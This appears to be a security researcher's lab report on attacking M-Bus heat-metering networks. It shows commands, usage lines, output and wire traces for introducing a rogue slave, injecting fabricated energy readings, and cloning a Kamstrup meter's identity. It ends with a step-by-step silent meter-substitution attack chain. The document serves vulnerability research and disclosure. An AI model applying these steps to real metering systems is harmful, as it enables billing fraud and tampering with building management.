# Phase 2E Summary: Rogue Slave / Meter Hijacking

**Date:** 2026-04-10  
**Operator:** Bealers (vibed/Claude)  
**Hardware:** Raspberry Pi (slave) + USB-to-M-Bus adapter, Raspberry Pi (master) + USB-to-M-Bus adapter  
**Target:** Kamstrup MULTICAL 602 (primary addr 206, secondary addr 060218782D2C0F04)

---

## Objective

Demonstrate that a rogue M-Bus slave device can be introduced onto the bus to:

1. Appear as a legitimate meter in a master scan (no credentials required to register)
2. Respond to data requests and return fully controlled fabricated readings
3. Clone a real meter's identity (secondary address + manufacturer identity) so that the master reads from the rogue device while believing it is communicating with the real meter

---

## Tooling Built

libmbus ships no slave-mode CLI tools. A custom slave was written in C against the libmbus serial API: `scripts/mbus-rogue-slave.c`.

```bash
# Build on Pi
gcc mbus-rogue-slave.c -lmbus -lm -o mbus-rogue-slave

# Usage
./mbus-rogue-slave <device> <primary_addr> [energy_kwh] [volume_liters] [secondary_addr_hex]
```

Key implementation notes:
- `MBUS_OPTION_PURGE_FIRST_FRAME` must be disabled (it is enabled by default for master mode and eats incoming frames if left on in slave use)
- `mbus_serial_recv_frame` used directly (not `mbus_recv_frame`) to avoid master-mode assumptions
- After transmitting, a 50–200ms sleep drains the TX echo from the RX line before the next recv call
- Frame start/stop bytes (`0x68`/`0x16`, ACK `0xE5`) must be set explicitly in the frame struct. `mbus_frame_pack` does not set them from the frame type.

---

## Step 1: Rogue Slave Visible in Master Scan

Slave started at unused primary address 99. Master scan result:

```
Found a M-Bus device at address 0
Found a M-Bus device at address 11
Found a M-Bus device at address 12
Found a M-Bus device at address 13
Found a M-Bus device at address 99    ← rogue slave
Found a M-Bus device at address 206
```

No credentials. No commissioning. The slave appeared alongside the real meters on the first scan.

---

## Step 2: Master Reads Fabricated Data

```
mbus-serial-request-data -b 2400 /dev/ttyUSB0 99
```

Master output (XML):

```xml
<SlaveInformation>
    <Id>13371337</Id>
    <Manufacturer>FAK</Manufacturer>
    <Medium>Heat: Outlet</Medium>
</SlaveInformation>
<DataRecord id="0">
    <Unit>Energy (kWh)</Unit>
    <Value>12345</Value>
</DataRecord>
<DataRecord id="1">
    <Unit>Volume (m m^3)</Unit>
    <Value>98765</Value>
</DataRecord>
```

The master accepted the rogue slave's response as a valid meter read. No challenge, no authentication, no alarm raised.

---

## Step 3: False Data Injection

Slave restarted with inflated readings (simulating over-billing fraud):

```
./mbus-rogue-slave /dev/ttyUSB0 99 999999 5000000
```

Master read returned `Energy: 999999 kWh, Volume: 5000000 m³`. Accepted without question.

| Scenario | Injected Value | Real-World Effect |
|----------|---------------|-------------------|
| Inflated energy | 999,999 kWh | Over-billing tenants |
| Deflated energy | 1 kWh | Revenue loss, under-billing |
| Zero readings | 0 kWh / 0 m³ | Appears as dead/failed meter |
| Extreme temperatures (future) | e.g. 150°C flow | BMS alarm trigger |

---

## Step 4: Secondary Address Cloning (Identity Theft)

This is the highest-impact test. The real Kamstrup was temporarily remapped to address 200 (using the Phase 2C address reassignment technique), then the rogue slave was configured to claim the Kamstrup's secondary address and identity.

**Secondary address note:** The libmbus secondary address scan reports addresses in a different byte order to the SELECT frame wire format. The scan reports `060218782D2C0F04` (ID bytes in little-endian wire order); the SELECT frame sends `781802062D2C0F04` (ID bytes in big-endian display order). The slave must be configured with the SELECT-frame format.

```bash
# Move real meter out of the way
mbus-serial-set-address -b 2400 /dev/ttyUSB0 206 200

# Start rogue slave claiming Kamstrup's secondary address
./mbus-rogue-slave /dev/ttyUSB0 99 54321 111111 781802062D2C0F04

# Master queries the real Kamstrup by secondary address
mbus-serial-request-data -b 2400 /dev/ttyUSB0 060218782D2C0F04
```

Master received (via rogue slave):

```xml
<SlaveInformation>
    <Id>6021878</Id>
    <Manufacturer>KAM</Manufacturer>
    <Version>15</Version>
    <Medium>Heat: Outlet</Medium>
</SlaveInformation>
<DataRecord id="0">
    <Unit>Energy (kWh)</Unit>
    <Value>54321</Value>
</DataRecord>
<DataRecord id="1">
    <Unit>Volume (m m^3)</Unit>
    <Value>111111</Value>
</DataRecord>
```

**Manufacturer: KAM. Medium: Heat. The master received fabricated readings from the rogue slave while believing it was communicating with the real Kamstrup MULTICAL 602.** No alarm was raised. The real meter was unreachable and invisible throughout.

Wire trace confirming the exchange:

```
SEND: 10 40 FD 3D 16        ← SND_NKE (deselect, ×2)
SEND: 68 0B 0B 68 73 FD 52 78 18 02 06 2D 2C 0F 04 C6 16  ← SELECT Kamstrup secondary addr
RECV: E5                    ← ACK from rogue slave
SEND: 10 5B FD 58 16        ← REQ_UD2 to selected slave (0xFD)
RECV: 68 1B 1B 68 08 FD 72 78 18 02 06 2D 2C 0F 04 ...    ← RSP_UD from rogue slave
```

---

## Combined Attack Chain

Phases 2C and 2E combine into a complete meter substitution attack:

1. **Enumerate** (Phase 2B): scan discovers all meters, primary and secondary addresses
2. **Remap** (Phase 2C): `mbus-serial-set-address` moves the real meter to an unused address (requires ~2 seconds of bus access, takes effect immediately)
3. **Substitute** (Phase 2E): rogue slave at the vacated address claims the real meter's secondary address and identity
4. **Inject** (Phase 2E): all subsequent master polls return attacker-controlled readings (arbitrary energy values, temperatures, timestamps)

From the master/BMS perspective: nothing changes. The same secondary address responds, the same manufacturer identity is reported, readings arrive on schedule. The attack is silent.

**Pre-condition:** The legitimate master must be offline during steps 2-3 (single-master constraint, see Finding 4). This window exists during maintenance or at any point the head-end is not actively polling.

---

## Restoration

```bash
# Stop rogue slave
kill $(pgrep mbus-rogue-slave)

# Restore Kamstrup to original address
mbus-serial-set-address -b 2400 /dev/ttyUSB0 200 206
```

---

## Evidence

- Tool source: `scripts/mbus-rogue-slave.c`
- Wire trace: see debug output above (captured via `-d` flag on `mbus-serial-request-data`)
